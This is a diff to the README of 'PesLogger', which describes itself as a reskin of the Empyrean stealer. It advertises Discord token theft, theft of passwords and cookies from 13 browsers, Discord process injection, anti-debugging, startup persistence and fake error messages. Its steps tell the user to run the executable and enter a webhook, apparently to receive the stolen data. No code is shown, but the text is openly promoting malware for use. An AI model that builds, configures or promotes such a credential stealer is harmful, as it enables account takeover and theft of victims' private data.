@@ -1,10 +1,23 @@
 # PesLogger
 dumb reskin of old version of Empyrean
 
-How to use:
+# Features
+- [Discord token info](img/em1.png)
+- [Browser stealing](img/em0.png) from 13 browsers (passwords, cookies, history, bookmarks, etc.)
+- [Discord process injection](img/em3.png) 
+- [Detailed system info](img/em2.png)
+- Anti Debugging
+- Startup persistence
+- Fake error messages
+- Custom icon
+
+# How to use
 1. Open PES_LOGGER.exe
 2. wait for load
 3. enter webhook
 4. enter configs
 (optional for icons) drag n drop .ico file into the command prompt
 5. use freely
+
+# Screenshots
+<img src=""https://cdn.discordapp.com/attachments/997378722577526834/1041832923093008434/image.png><img src="">
